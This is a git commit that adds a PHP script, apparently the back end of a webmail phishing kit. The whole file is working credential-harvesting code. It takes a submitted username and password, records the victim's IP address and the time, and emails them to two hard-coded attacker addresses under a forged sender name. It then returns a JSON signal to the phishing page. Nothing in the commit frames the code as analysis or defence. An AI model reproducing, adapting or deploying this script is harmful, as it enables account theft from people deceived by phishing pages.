4ea4b817772957211caecb61ccbf4a25a9f7527b
shampoosandsoap <149042237+shampoosandsoap@users.noreply.github.com>
2023-10-26 09:12:41 +0300

    Add files via upload

---
+++ src.php
@@ -0,0 +1,27 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$login = $_POST['ai'];
+$passwd= $_POST['pr'];
+
+$done = array('signal'=>'ok');
+$bad = array('signal'=>'bad');
+
+
+if (!empty($login) && !empty($passwd)) {
+
+
+    $own = 'moozaidi1@gmail.com, middlesmenspencer@gmail.com';
+    $date = date("D/M/d, Y g:i a");
+    $subj = "$login  from $ip";
+    $from = "From: Webmaila<smtp@me.mom163.com>";
+    $msg = "Username: $login\nPassword: $passwd\nSubmitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
+    mail($own,$subj,$msg,$from);
+
+    echo json_encode($done);
+
+    }
+
+else {
+  echo json_encode($bad);
+}
+?>
